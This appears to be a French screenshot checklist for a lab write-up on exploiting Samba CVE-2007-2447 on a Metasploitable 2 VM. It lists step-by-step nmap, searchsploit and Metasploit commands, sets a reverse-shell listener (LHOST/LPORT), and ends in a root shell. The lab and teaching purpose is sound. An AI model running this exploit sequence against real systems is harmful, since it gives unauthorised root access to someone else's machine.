# Captures — Samba "username map script" (MS2, ports 139/445)

Cible : `192.168.56.101` · Kali/LHOST : `192.168.56.1`.
5 captures. Chaque capture montre **la commande tapée ET son résultat** (prompt visible).

## 01-recon-nmap.png

Commande :
```bash
nmap -sV -p 139,445 192.168.56.101
```

Encadrer en rouge : les deux lignes `139/tcp ... Samba smbd 3.X - 4.X` et
`445/tcp ... Samba smbd 3.X - 4.X`.

## 02-recherche-module.png

Les deux recherches à la suite dans le même terminal :
```bash
searchsploit samba 3.0
msfconsole -q -x "search usermap_script; exit"
```

Encadrer en rouge : la ligne `Samba 3.0.20 < 3.0.25rc3 - 'Username' map script` (searchsploit)
et la ligne `0  exploit/multi/samba/usermap_script` (search).

## 03-info-cve.png

Commande :
```bash
msfconsole -q -x "info exploit/multi/samba/usermap_script; exit"
```

Encadrer en rouge : la ligne `https://nvd.nist.gov/vuln/detail/CVE-2007-2447` sous
`References`.

## 04-exploit-config.png

En interactif dans `msfconsole`, commande par commande :
```
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(...) > set RHOSTS 192.168.56.101
msf6 exploit(...) > set LHOST 192.168.56.1
msf6 exploit(...) > set LPORT 4446
```

Encadrer en rouge : aucun (liste des `set` déjà courte et lisible).

## 05-session-root.png

Déclenchement + preuve, dans la même session :
```
msf6 exploit(...) > run -z
msf6 exploit(...) > sessions -c "id; uname -a; hostname; whoami" -i 1
```

Encadrer en rouge : la ligne `[*] Command shell session 1 opened ...` et la ligne
`uid=0(root) gid=0(root)`.
